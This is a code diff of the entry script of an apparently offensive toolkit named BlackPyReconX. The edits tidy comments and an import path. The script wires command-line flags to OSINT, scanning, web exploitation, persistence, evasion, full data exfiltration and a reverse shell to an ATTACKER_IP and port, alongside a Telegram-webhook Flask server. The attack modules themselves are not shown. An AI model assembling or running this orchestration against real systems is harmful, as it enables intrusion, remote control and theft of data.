@@ -4,16 +4,15 @@ import sys
 from dotenv import load_dotenv
 from pathlib import Path
 
-# Chargement des variables d’environnement depuis .env
+# 🔐 Chargement des variables d’environnement depuis .env
 load_dotenv()
 
 # 📁 Ajout du chemin racine pour les imports locaux
 BASE_DIR = Path(__file__).resolve().parent
 sys.path.append(str(BASE_DIR))
-sys.path.append(str(BASE_DIR / "models"))
+sys.path.append(str(BASE_DIR / "modules"))  # ✅ Correction ici : c'était "models" à tort
 
-
-# Importation des modules BlackPyReconX
+# ✅ Importation des modules BlackPyReconX
 from modules import (
     osint,
     scanner,
@@ -43,35 +42,29 @@ def run_cli():
 
     if args.osint:
         osint.run(args.target)
-
     if args.scan:
         scanner.run(args.target)
-
     if args.web:
         exploit_web.run(args.target)
-
     if args.exploit_sys:
         attacker_ip = os.getenv("ATTACKER_IP", "127.0.0.1")
         attacker_port = int(os.getenv("ATTACKER_PORT", "4444"))
         exploit_sys.reverse_shell(attacker_ip, attacker_port)
-
     if args.persist:
         persistence.run(args.target)
-
     if args.evasion:
         evasion.run()
-
     if args.exfil:
         exfiltration.full_exfiltration()
-
     if args.report:
         reporting.generate_report()
 
 def run_server():
     from flask import Flask
-    from telegram_bot import webhook  # ✅ Import corrigé depuis ton dossier personnel
-
+    from telegram_bot import webhook  # ✅ Correct
     app = Flask(__name__)
+
+    # 📡 Route Telegram correcte
     app.register_blueprint(webhook.telegram_webhook, url_prefix="/telegram")
 
     @app.route("/")
